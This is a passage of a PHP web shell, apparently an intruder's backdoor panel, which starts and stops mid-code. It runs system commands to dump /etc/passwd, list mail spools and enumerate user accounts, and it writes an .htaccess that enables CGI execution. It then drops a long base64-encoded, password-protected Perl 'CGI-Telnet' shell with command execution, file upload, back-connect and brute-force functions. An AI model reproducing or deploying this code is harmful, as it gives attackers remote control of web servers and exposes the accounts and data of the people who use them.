if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}}
elseif($_GET['do'] == 'cgitelnet') {
    echo "<center><h3>Cgi Telnet</h3>";
    echo "<form method='post'><input type='submit' name='cgi' value='CGI PERL'> <input type='submit' name='cgi2' value='CGI PERL 2'> <input type='submit' name='cgipy' value='CGI PYTHON'></form>";
    if(isset($_POST['cgi'])) {
	$cgi_dir = mkdir('kuda_cgi', 0755);
        chdir('kuda_cgi');
	$file_cgi = "cgi.kuda";
        $memeg = ".htaccess";
	$isi_htcgi = "Options Indexes Includes ExecCGI FollowSymLinks\nAddType application/x-httpd-cgi .kuda\nAddHandler cgi-script .kuda\nAddHandler cgi-script .kuda";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS4zIjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7DQoNCiRQYXNzd29yZCA9ICJrdWRhanVtcGluZyI7DQpzdWIgSXNfV2luKCl7DQoJJG9zID0gJnRyaW0oJEVOVnsiU0VSVkVSX1NPRlRXQVJFIn0pOw0KCWlmKCRvcyA9fiBtL3dpbi9pKXsNCgkJcmV0dXJuIDE7DQoJfQ0KCWVsc2V7DQoJCXJldHVybiAwOw0KCX0NCn0NCiRXaW5OVCA9ICZJc19XaW4oKTsJCQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZg0KCQkJCQkJCQkjIHlvdSdyZSBydW5uaW5nIHRoaXMgc2NyaXB0IG9uIGEgV2luZG93cyBOVA0KCQkJCQkJCQkjIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlvdQ0KCQkJCQkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuDQoNCiROVENtZFNlcCA9ICImIjsJCQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNlcCA9ICI7IjsJCQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwMDAwOwkjIFRpbWUgaW4gc2Vjb25kcyBhZnRlciBjb21tYW5kcyB3aWxsIGJlIGtpbGxlZA0KCQkJCQkJCQkjIERvbid0IHNldCB0aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcw0KCQkJCQkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0DQoJCQkJCQkJCSMgdGFrZSB2ZXJ5IGxvbmcgdG8gZXhlY3V0ZSwgbGlrZSAiZmluZCAvIi4NCgkJCQkJCQkJIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJzLiBJdCBpcw0KCQkJCQkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4NCg0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlDQoJCQkJCQkJCSMgYnJvd3NlciBhcyBzb29uIGFzIGl0IGlzIG91dHB1dCwgb3RoZXJ3aXNlDQoJCQkJCQkJCSMgaXQgaXMgYnVmZmVyZWQgYW5kIHNlbmQgd2hlbiB0aGUgY29tbWFuZA0KCQkJCQkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCgkJCQkJCQkJIyBwaW5nLCBzbyB0aGF0IHlvdSBjYW4gc2VlIHRoZSBvdXRwdXQgYXMgaXQNCgkJCQkJCQkJIyBpcyBiZWluZyBnZW5lcmF0ZWQuDQoNCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISENCg0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQokY29scz0gMTUwOw0KJHJvd3M9IDI2Ow0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0DQojIHBhcnNlcyBHRVQsIFBPU1QgYW5kIG11bHRpcGFydC9mb3JtLWRhdGEgdGhhdCBpcyB1c2VkIGZvciB1cGxvYWRpbmcgZmlsZXMuDQojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uDQojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mDQojIHRoZSB2YXJpYWJsZS4gTm90ZTogTW9zdCBvZiB0aGUgY29kZSBpbiB0aGlzIGZ1bmN0aW9uIGlzIHRha2VuIGZyb20gb3RoZXIgQ0dJDQojIHNjcmlwdHMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUmVhZFBhcnNlIA0Kew0KCWxvY2FsICgqaW4pID0gQF8gaWYgQF87DQoJbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCgkNCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsNCg0KCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpDQoJew0KCQkkaW4gPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCgl9DQoJZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpDQoJew0KCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7DQoJCXJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQoJfQ0KDQoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQ0KCWlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQ0KCXsNCgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyANCgkJQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsgDQoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07DQoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsNCgkJJEhlYWRlciA9ICRgOw0KCQkkQm9keSA9ICQnOw0KIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQ0KCQkkaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsNCgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyANCgkJJGlueydmJ30gPSAkMTsgDQoJCSRpbnsnZid9ID1+IHMvXCIvL2c7DQoJCSRpbnsnZid9ID1+IHMvXHMvL2c7DQoNCgkJIyBwYXJzZSB0cmFpbGVyDQoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQoJCXsgDQoJCQkkbGlzdFskaV0gPX4gcy9eLituYW1lPSQvLzsNCgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsNCgkJCSRrZXkgPSAkMTsNCgkJCSR2YWwgPSAkJzsNCgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9ID0gJHZhbDsgDQoJCX0NCgl9DQoJZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpDQoJew0KCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7DQoJCWZvcmVhY2ggJGkgKDAgLi4gJCNpbikNCgkJew0KCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsNCgkJCSgka2V5LCAkdmFsKSA9IHNwbGl0KC89LywgJGluWyRpXSwgMik7DQoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSAuPSAiXDAiIGlmIChkZWZpbmVkKCRpbnska2V5fSkpOw0KCQkJJGlueyRrZXl9IC49ICR2YWw7DQoJCX0NCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyDQojIEFyZ3VtZW50IDE6IEZvcm0gaXRlbSBuYW1lIHRvIHdoaWNoIGZvY3VzIHNob3VsZCBiZSBzZXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VIZWFkZXINCnsNCgkkRW5jb2RlZEN1cnJlbnREaXIgPSAkQ3VycmVudERpcjsNCgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KCW15ICRkaXIgPSRDdXJyZW50RGlyOw0KCSRkaXI9fiBzL1xcL1xcXFwvZzsNCglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCglwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+DQo8dGl0bGU+SGFjc3VnaWE8L3RpdGxlPg0KDQokSHRtbE1ldGFIZWFkZXINCg0KPC9oZWFkPg0KPHN0eWxlPg0KYm9keXsNCmZvbnQ6IDEwcHQgVmVyZGFuYTsNCn0NCnRyIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KY29sb3I6ICNmZjk5MDA7DQp9DQp0ZCB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCmNvbG9yOiAjMkJBOEVDOw0KZm9udDogMTBwdCBWZXJkYW5hOw0KfQ0KDQp0YWJsZSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxMTE7DQp9DQoNCg0KaW5wdXQgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmZvbnQ6IDEwcHQgVmVyZGFuYTsNCmNvbG9yOiAjZmY5OTAwOw0KfQ0KDQppbnB1dC5zdWJtaXQgew0KdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KY29sb3I6ICNGRkZGRkY7DQpib3JkZXItY29sb3I6ICMwMDk5MDA7DQp9DQoNCmNvZGUgew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOw0KY29sb3I6IHdoaWxlOw0KfQ0KDQpydW4gew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpmb250OiAxMHB0IFZlcmRhbmEgYm9sZDsNCmNvbG9yOiAjRkYwMEFBOw0KfQ0KDQp0ZXh0YXJlYSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7DQpmb250OiBGaXhlZHN5cyBib2xkOw0KY29sb3I6ICNhYWE7DQp9DQpBOmxpbmsgew0KCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTpob3ZlciB7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjZmY5OTAwOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6YWN0aXZlIHsNCgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCg0KLmxpc3RkaXIgdHI6aG92ZXJ7DQoJYmFja2dyb3VuZDogIzQ0NDsNCn0NCi5saXN0ZGlyIHRyOmhvdmVyIHRkew0KCWJhY2tncm91bmQ6ICM0NDQ7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmU7DQp9DQoubm90bGluZXsNCgliYWNrZ3JvdW5kOiAjMTExOw0KfQ0KLmxpbmV7DQoJYmFja2dyb3VuZDogIzIyMjsNCn0NCjwvc3R5bGU+DQo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4NCmZ1bmN0aW9uIGNobW9kX2Zvcm0oaSxmaWxlKQ0Kew0KCS8qdmFyIGFqYXg9J2FqYXhfUG9zdERhdGEoIkZvcm1QZXJtc18nK2krJyIsIiRTY3JpcHRMb2NhdGlvbiIsIlJlc3BvbnNlRGF0YSIpOyByZXR1cm4gZmFsc2U7JzsqLw0KCXZhciBhamF4PSIiOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlUGVybXNfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPWNobW9kIHR5cGU9dGV4dCBzaXplPTUgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGFqYXggKyAiJyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRkaXInPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWYgdmFsdWU9JyIrZmlsZSsiJz48L2Zvcm0+IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsNCn0NCmZ1bmN0aW9uIHJtX2NobW9kX2Zvcm0ocmVzcG9uc2UsaSxwZXJtcyxmaWxlKQ0Kew0KCXJlc3BvbnNlLmlubmVySFRNTCA9ICI8c3BhbiBvbmNsaWNrPVxcXCJjaG1vZF9mb3JtKCIgKyBpICsgIiwnIisgZmlsZSsgIicpXFxcIiA+IisgcGVybXMgKyI8L3NwYW4+PC90ZD4iOw0KfQ0KZnVuY3Rpb24gcmVuYW1lX2Zvcm0oaSxmaWxlLGYpDQp7DQoJdmFyIGFqYXg9IiI7DQoJZi5yZXBsYWNlKC9cXFxcL2csIlxcXFxcXFxcIik7DQoJdmFyIGJhY2s9InJtX3JlbmFtZV9mb3JtKCIraSsiLFxcXCIiK2ZpbGUrIlxcXCIsXFxcIiIrZisiXFxcIik7IHJldHVybiBmYWxzZTsiOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1yZW5hbWUgdHlwZT10ZXh0IHZhbHVlPSAnIitmaWxlKyInIC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBhamF4ICsgIicgdmFsdWU9T0s+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBiYWNrICsgIicgdmFsdWU9Q2FuY2VsPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOw0KfQ0KZnVuY3Rpb24gcm1fcmVuYW1lX2Zvcm0oaSxmaWxlLGYpDQp7DQoJaWYoZj09J2YnKQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0kZGlyJmM9ZWRpdCUyMCIrZmlsZSsiJTIwJz4iICtmaWxlKyAiPC9hPiI7DQoJfWVsc2UNCgl7DQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8YSBocmVmPSc/YT1ndWkmZD0iK2YrIic+WyAiICtmaWxlKyAiIF08L2E+IjsNCgl9DQp9DQo8L3NjcmlwdD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMGMwYzBjIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPg0KPGNlbnRlcj48Y29kZT4NCjx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjIiPg0KPHRyPg0KCTx0ZCBhbGlnbj0iY2VudGVyIiByb3dzcGFuPTI+DQoJCTxiPjxmb250IHNpemU9IjUiPiRFZGl0UGVyc2lvbjwvZm9udD48L2I+DQoJPC90ZD4NCg0KCTx0ZD4NCg0KCQk8Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4kRU5WeyJTRVJWRVJfU09GVFdBUkUifTwvZm9udD4NCgk8L3RkPg0KCTx0ZD5TZXJ2ZXIgSVA6PGZvbnQgY29sb3I9IiNiYjAwMDAiPiAkRU5WeydTRVJWRVJfQUREUid9PC9mb250PiB8IFlvdXIgSVA6IDxmb250IGNvbG9yPSIjYmIwMDAwIj4kRU5WeydSRU1PVEVfQUREUid9PC9mb250Pg0KCTwvdGQ+DQoNCjwvdHI+DQoNCjx0cj4NCjx0ZCBjb2xzcGFuPSIzIj48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4NCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbiI+SG9tZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNvbW1hbmQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkNvbW1hbmQ8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWd1aSZkPSRFbmNvZGVkQ3VycmVudERpciI+R1VJPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5Eb3dubG9hZCBGaWxlPC9hPiB8DQoNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YnJ1dGVmb3JjZXIiPkJydXRlIEZvcmNlcjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y2hlY2tsb2ciPkNoZWNrIExvZzwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG9tYWluc3VzZXIiPkRvbWFpbnMvVXNlcnM8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+TG9nb3V0PC9hPiB8DQo8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0iIyI+SGVscDwvYT4NCg0KPC9mb250PjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjxmb250IGlkPSJSZXNwb25zZURhdGEiIGNvbG9yPSIjZmY5OWNjIiA+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5TY3JlZW4NCnsNCg0KCXByaW50IDw8RU5EOw0KPHByZT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQpUeXBpbmdUZXh0ID0gZnVuY3Rpb24oZWxlbWVudCwgaW50ZXJ2YWwsIGN1cnNvciwgZmluaXNoZWRDYWxsYmFjaykgew0KICBpZigodHlwZW9mIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkID09ICJ1bmRlZmluZWQiKSB8fCAodHlwZW9mIGVsZW1lbnQuaW5uZXJIVE1MID09ICJ1bmRlZmluZWQiKSkgew0KICAgIHRoaXMucnVubmluZyA9IHRydWU7CS8vIE5ldmVyIHJ1bi4NCiAgICByZXR1cm47DQogIH0NCiAgdGhpcy5lbGVtZW50ID0gZWxlbWVudDsNCiAgdGhpcy5maW5pc2hlZENhbGxiYWNrID0gKGZpbmlzaGVkQ2FsbGJhY2sgPyBmaW5pc2hlZENhbGxiYWNrIDogZnVuY3Rpb24oKSB7IHJldHVybjsgfSk7DQogIHRoaXMuaW50ZXJ2YWwgPSAodHlwZW9mIGludGVydmFsID09ICJ1bmRlZmluZWQiID8gMTAwIDogaW50ZXJ2YWwpOw0KICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5lbGVtZW50LmlubmVySFRNTDsNCiAgdGhpcy51bnBhcnNlZE9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dDsNCiAgdGhpcy5jdXJzb3IgPSAoY3Vyc29yID8gY3Vyc29yIDogIiIpOw0KICB0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQogIHRoaXMuY3VycmVudENoYXIgPSAwOw0KICB0aGlzLmVsZW1lbnQudHlwaW5nVGV4dCA9IHRoaXM7DQogIGlmKHRoaXMuZWxlbWVudC5pZCA9PSAiIikgdGhpcy5lbGVtZW50LmlkID0gInR5cGluZ3RleHQiICsgVHlwaW5nVGV4dC5jdXJyZW50SW5kZXgrKzsNCiAgVHlwaW5nVGV4dC5hbGwucHVzaCh0aGlzKTsNCiAgdGhpcy5ydW5uaW5nID0gZmFsc2U7DQogIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgdGhpcy50YWdCdWZmZXIgPSAiIjsNCiAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsNCiAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiI7DQp9DQpUeXBpbmdUZXh0LmFsbCA9IG5ldyBBcnJheSgpOw0KVHlwaW5nVGV4dC5jdXJyZW50SW5kZXggPSAwOw0KVHlwaW5nVGV4dC5ydW5BbGwgPSBmdW5jdGlvbigpIHsNCiAgZm9yKHZhciBpID0gMDsgaSA8IFR5cGluZ1RleHQuYWxsLmxlbmd0aDsgaSsrKSBUeXBpbmdUZXh0LmFsbFtpXS5ydW4oKTsNCn0NClR5cGluZ1RleHQucHJvdG90eXBlLnJ1biA9IGZ1bmN0aW9uKCkgew0KICBpZih0aGlzLnJ1bm5pbmcpIHJldHVybjsNCiAgaWYodHlwZW9mIHRoaXMub3JpZ1RleHQgPT0gInVuZGVmaW5lZCIpIHsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZ